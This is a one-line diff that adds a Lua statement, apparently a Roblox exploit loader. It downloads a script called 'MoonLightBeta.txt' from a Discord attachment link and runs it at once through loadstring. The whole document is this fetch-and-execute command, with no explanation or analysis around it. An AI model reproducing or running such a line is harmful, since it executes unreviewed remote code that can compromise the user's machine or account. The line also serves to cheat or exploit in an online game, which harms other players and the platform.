@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://cdn.discordapp.com/attachments/980105264684478464/1002239072217092106/MoonLightBeta.txt"), true))()
